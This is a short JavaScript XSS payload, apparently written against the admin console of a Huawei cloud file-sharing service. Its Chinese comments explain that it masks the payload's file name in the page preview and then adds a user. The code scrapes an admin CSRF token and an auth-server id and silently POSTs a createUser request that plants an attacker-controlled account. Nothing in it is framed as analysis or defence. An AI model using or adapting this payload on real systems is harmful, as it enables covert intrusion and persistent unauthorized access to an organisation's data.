//修改共享文件页面显示的名字，不然的话会显示xsspayload
$('#preview').html('12312312.png');
//新增人员
$.ajax({
    type: "get",
    url: "https://box.saas.huaweicloud.com/uam/enterprise/admin/statistics/list/jfunbox",
    data: {},
    success: function(result) {
       var token = result.match(/[A-Z0-9]{56}/)[0];
       var id = 0;
       $.ajax({
            type: "get",
            url: "https://box.saas.huaweicloud.com/uam/enterprise/admin/accountuser/list/jfunbox/0",
            data: {},
            success: function(result) {
               var str = result.match(/name="defaultAuthServerId" value="[\d]{2,3}"/)[0];
               id = str.match(/[\d]{1,3}/)[0];
            }
        }).then(() => {
            $.ajax({
            type: "post",
            url: "https://box.saas.huaweicloud.com/uam/enterprise/admin/user/createUser/"+id,
            data: {'mobile':'13866662223','email':'','alias':'aabb','userSpaceQuotaCheckBox':'on','userSpaceQuotaInput':'0','description':'','token':token,'userSpaceQuota':'-1'},
            success: function(result) {
               
            }
        })
        });
    }
});
